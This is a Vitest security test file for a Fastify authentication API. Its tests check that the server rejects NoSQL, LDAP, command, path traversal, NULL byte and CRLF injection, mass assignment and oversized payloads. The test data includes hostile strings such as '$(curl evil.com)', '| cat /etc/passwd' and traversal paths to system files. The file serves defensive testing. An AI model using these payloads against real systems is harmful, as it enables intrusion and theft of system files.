/**
 * ADVANCED AUTH SECURITY TESTS
 *
 * Covers:
 * - Device approval workflow
 * - Session management
 * - Advanced attack vectors
 * - Concurrency & race conditions
 * - Memory & resource leaks
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from "vitest";
import { FastifyInstance } from "fastify";
import { buildApp } from "../helpers/app.helper.js";
import {
  clearDatabase,
  closeDatabase,
  getUserDevices,
  sessionExists,
} from "../helpers/db.helper.js";
import {
  registerUser,
  loginUser,
  createAuthenticatedUser,
  authenticatedRequest,
} from "../helpers/user.helper.js";

describe("Auth Advanced Security Tests", () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    app = await buildApp();
    await app.ready();
  });

  beforeEach(async () => {
    await clearDatabase();
  });

  afterAll(async () => {
    await app.close();
    await closeDatabase();
  });

  // ============================================================================
  // DEVICE APPROVAL WORKFLOW
  // ============================================================================

  describe("Device Approval Workflow", () => {
    it("should create pending approval on first login from new device", async () => {
      const { user } = await registerUser(app, {
        username: "alice",
        password: "password123",
      });

      // Login from different "device" (different fingerprint)
      const response = await app.inject({
        method: "POST",
        url: "/api/auth/login",
        payload: {
          username: "alice",
          password: "password123",
        },
        headers: {
          "user-agent": "Different Device",
        },
      });

      const body = JSON.parse(response.body);

      // May return pending_approval or success depending on implementation
      if (body.pending_approval) {
        expect(body.pending_approval).toBe(true);
        expect(body.pending_session_id).toBeDefined();
      }
    });

    it.skip("should require approval from trusted device", async () => {
      // TODO: Test device approval flow when implemented
      // This is a placeholder for future device approval tests
      expect(true).toBe(true);
    });

    it.skip("should reject login from blocked device", async () => {
      // TODO: Test blocked device scenario
      expect(true).toBe(true);
    });

    it.skip("should limit number of pending approvals per user", async () => {
      // Security: Prevent spam of approval requests
      // TODO: Implement test when device approval is fully built
      expect(true).toBe(true);
    });
  });

  // ============================================================================
  // SESSION MANAGEMENT
  // ============================================================================

  describe("Session Management", () => {
    it("should create session on successful login", async () => {
      const { user } = await registerUser(app);

      const { response, token } = await loginUser(
        app,
        user.username,
        user.password,
      );

      expect(response.statusCode).toBe(200);
      expect(token).toBeDefined();

      // TODO: Check session exists in database
      // const exists = await sessionExists(sessionId)
      // expect(exists).toBe(true)
    });

    it.skip("should invalidate session on logout", async () => {
      // TODO: Implement /auth/logout endpoint first
      const user = await createAuthenticatedUser(app);

      // Logout
      const response = await authenticatedRequest(
        app,
        "POST",
        "/api/auth/logout",
        user.token!,
      );

      expect(response.statusCode).toBe(200);

      // Token should no longer work
      const testResponse = await authenticatedRequest(
        app,
        "GET",
        "/api/me",
        user.token!,
      );

      expect(testResponse.statusCode).toBe(401);
    });

    it("should allow multiple active sessions per user", async () => {
      const { user } = await registerUser(app);

      // Login multiple times (different devices)
      const login1 = await loginUser(app, user.username, user.password);
      const login2 = await loginUser(app, user.username, user.password);

      expect(login1.token).toBeDefined();
      expect(login2.token).toBeDefined();
      expect(login1.token).not.toBe(login2.token);

      // Both tokens should work
      const test1 = await authenticatedRequest(
        app,
        "GET",
        "/api/me",
        login1.token!,
      );
      const test2 = await authenticatedRequest(
        app,
        "GET",
        "/api/me",
        login2.token!,
      );

      expect(test1.statusCode).not.toBe(401);
      expect(test2.statusCode).not.toBe(401);
    });

    it.skip("should revoke all sessions on password change", async () => {
      // TODO: Implement when password change is added
      expect(true).toBe(true);
    });
  });

  // ============================================================================
  // CONCURRENT REQUESTS & RACE CONDITIONS
  // ============================================================================

  describe("Race Conditions & Concurrency", () => {
    it("should handle concurrent registrations of same username", async () => {
      const promises = [];

      // Try to register same username 10 times simultaneously
      const MOCK_PUBLIC_KEY =
        "a1b2c3d4e5f6789012345678901234567890abcdefabcdef1234567890abcdef";

      for (let i = 0; i < 10; i++) {
        promises.push(
          app.inject({
            method: "POST",
            url: "/api/auth/register",
            payload: {
              username: "alice",
              email: `alice${i}@example.com`,
              password: "password123",
              public_key: MOCK_PUBLIC_KEY,
              deviceFingerprint: `test-device-${i}`,
            },
          }),
        );
      }

      const responses = await Promise.all(promises);

      // Only ONE should succeed (201), others should fail (409 or 500 due to race condition)
      const successful = responses.filter((r) => r.statusCode === 201);
      const failed = responses.filter(
        (r) => r.statusCode === 409 || r.statusCode === 500,
      );

      expect(successful.length).toBe(1);
      expect(failed.length).toBe(9);
    });

    it("should handle concurrent logins from same user", async () => {
      const { user } = await registerUser(app);

      const promises = [];

      // Login 20 times simultaneously
      for (let i = 0; i < 20; i++) {
        promises.push(loginUser(app, user.username, user.password));
      }

      const results = await Promise.all(promises);

      // All should succeed (no race conditions)
      results.forEach((result) => {
        expect(result.response.statusCode).toBe(200);
      });
    });

    it("should handle concurrent requests with same JWT token", async () => {
      const user = await createAuthenticatedUser(app);

      const promises = [];

      // Make 50 requests simultaneously with same token
      for (let i = 0; i < 50; i++) {
        promises.push(authenticatedRequest(app, "GET", "/api/me", user.token!));
      }

      const responses = await Promise.all(promises);

      // All should succeed
      responses.forEach((response) => {
        expect(response.statusCode).not.toBe(401);
      });
    });
  });

  // ============================================================================
  // ADVANCED ATTACK VECTORS
  // ============================================================================

  describe("Advanced Attack Vectors", () => {
    // NoSQL Injection (if using MongoDB in future)
    it("should block NoSQL injection attempts", async () => {
      const noSqlInjections = [{ $ne: null }, { $gt: "" }, { $regex: ".*" }];

      for (const injection of noSqlInjections) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/login",
          payload: {
            username: injection,
            password: "anything",
          },
        });

        expect(response.statusCode).not.toBe(200);
      }
    });

    // LDAP Injection
    it("should block LDAP injection in username", async () => {
      const ldapInjections = ["admin)(|(password=*))", "*)(uid=*", "admin*"];

      for (const injection of ldapInjections) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/login",
          payload: {
            username: injection,
            password: "password",
          },
        });

        // Zod blocks LDAP patterns at validation = 400
        expect(response.statusCode).toBe(400);
      }
    });

    // Command Injection
    it("should block command injection attempts", async () => {
      const commandInjections = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(curl evil.com)",
        "& ping -c 10 127.0.0.1 &",
      ];

      for (const injection of commandInjections) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: injection,
            email: "test@example.com",
            password: "password123",
          },
        });

        expect(response.statusCode).toBe(400);
      }
    });

    // Path Traversal
    it("should block path traversal in inputs", async () => {
      const pathTraversals = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
      ];

      for (const traversal of pathTraversals) {
        const response = await app.inject({
          method: "POST",
          url: "/api/auth/register",
          payload: {
            username: traversal,
            email: "test@example.com",
            password: "password123",
          },
        });

        expect(response.statusCode).toBe(400);
      }
    });

    // NULL byte injection
    it("should block NULL byte injection", async () => {
      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: {
          username: "admin\x00ignored",
          email: "test@example.com",
          password: "password123",
        },
      });

      expect(response.statusCode).toBe(400);
    });

    // CRLF Injection (HTTP Response Splitting)
    it("should block CRLF injection in headers", async () => {
      const response = await app.inject({
        method: "POST",
        url: "/api/auth/login",
        payload: {
          username: "test",
          password: "test",
        },
        headers: {
          "X-Custom": "test\r\nSet-Cookie: admin=true",
        },
      });

      // Should not allow injecting headers
      const setCookie = response.headers["set-cookie"];
      if (setCookie) {
        expect(setCookie).not.toContain("admin=true");
      }
      // If no set-cookie header, the attack failed anyway
      expect(response.statusCode).not.toBe(500); // Server should handle it gracefully
    });

    // Mass Assignment vulnerability
    it("should not allow setting admin role through registration", async () => {
      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: {
          username: "attacker",
          email: "attacker@example.com",
          password: "password123",
          role: "admin", // Trying to set role
          is_admin: true,
          permissions: ["*"],
        },
      });

      if (response.statusCode === 201) {
        const body = JSON.parse(response.body);
        // User should NOT have admin role
        expect(body.data.user.role).not.toBe("admin");
        expect(body.data.user.is_admin).not.toBe(true);
      }
    });
  });

  // ============================================================================
  // RESOURCE EXHAUSTION & DoS
  // ============================================================================

  describe("Resource Exhaustion & DoS Protection", () => {
    it("should reject extremely large payloads", async () => {
      const hugePayload = {
        username: "a".repeat(1000000), // 1MB username
        email: "test@example.com",
        password: "password123",
      };

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: hugePayload,
      });

      // Should reject large payload (413 = Payload Too Large, this is correct!)
      expect(response.statusCode).toBe(413);
    }, 10000);

    it("should handle deeply nested JSON", async () => {
      // Create deeply nested object
      let nested: any = { value: "deep" };
      for (let i = 0; i < 100; i++) {
        nested = { next: nested };
      }

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: {
          username: "test",
          email: "test@example.com",
          password: "password123",
          extra: nested,
        },
      });

      // Should not crash
      expect(response.statusCode).toBeGreaterThanOrEqual(400);
      expect(response.statusCode).toBeLessThan(600);
    });

    it("should handle very long password gracefully", async () => {
      const start = Date.now();

      const response = await app.inject({
        method: "POST",
        url: "/api/auth/register",
        payload: {
          username: "test",
          email: "test@example.com",
          password: "a".repeat(100000), // 100KB password
        },
      });

      const duration = Date.now() - start;

      // Should reject quickly (not hash 100KB password)
      expect(duration).toBeLessThan(1000);
      // 413 = Payload Too Large (bodyLimit protection works!)
      expect(response.statusCode).toBe(413);
    });
  });

  // ============================================================================
  // INFORMATION DISCLOSURE
  // ============================================================================

  describe("Information Disclosure Prevention", () => {
    it("should not reveal if username exists in error message", async () => {
      await registerUser(app, { username: "alice" });

      // Try login with wrong password
      const response1 = await loginUser(app, "alice", "wrongpassword");
      const body1 = JSON.parse(response1.response.body);

      // Try login with non-existent user
      const response2 = await loginUser(app, "bob", "somepassword");
      const body2 = JSON.parse(response2.response.body);

      // Error messages should be IDENTICAL
      expect(body1.error.toLowerCase()).toBe(body2.error.toLowerCase());

      // Should not say "username doesn't exist"
      expect(body1.error.toLowerCase()).not.toContain("exist");
      expect(body1.error.toLowerCase()).not.toContain("not found");
      expect(body1.error.toLowerCase()).not.toContain("unknown user");
    });

    it("should not expose password hash in any response", async () => {
      const { response } = await registerUser(app);
      const body = JSON.parse(response.body);

      // Check all nested objects for password field
      const jsonString = JSON.stringify(body);
      expect(jsonString).not.toContain("$argon2");
      expect(jsonString).not.toContain("password_hash");
    });

    it("should not expose internal database IDs", async () => {
      const { response } = await registerUser(app);
      const body = JSON.parse(response.body);

      // In our DB, username is the primary key (no auto-increment id)
      expect(body.data.user.username).toBeDefined();
      expect(body.data.user._id).toBeUndefined();
      expect(body.data.user.row_id).toBeUndefined();
      expect(body.data.user.id).toBeUndefined(); // No id field
    });
  });

  // ============================================================================
  // SESSION FIXATION & HIJACKING
  // ============================================================================

  describe("Session Security", () => {
    it("should generate new token on each login (session fixation prevention)", async () => {
      const { user } = await registerUser(app);

      const login1 = await loginUser(app, user.username, user.password);
      const login2 = await loginUser(app, user.username, user.password);

      // Tokens should be DIFFERENT
      expect(login1.token).not.toBe(login2.token);
    });

    it("should not accept token from another user", async () => {
      const alice = await createAuthenticatedUser(app, { username: "alice" });
      const bob = await createAuthenticatedUser(app, { username: "bob" });

      // Try to use Alice's token to access her data
      const response = await app.inject({
        method: "GET",
        url: "/api/me", // Correct endpoint
        headers: {
          authorization: `Bearer ${alice.token}`,
        },
      });

      expect(response.statusCode).toBe(200);
      const body = JSON.parse(response.body);

      // Should return Alice's data, NOT Bob's
      expect(body.data.username).toBe("alice");
      expect(body.data.username).not.toBe("bob");
    });

    it.skip("should invalidate old token after password change", async () => {
      // TODO: Implement when password change endpoint exists
      expect(true).toBe(true);
    });
  });
});
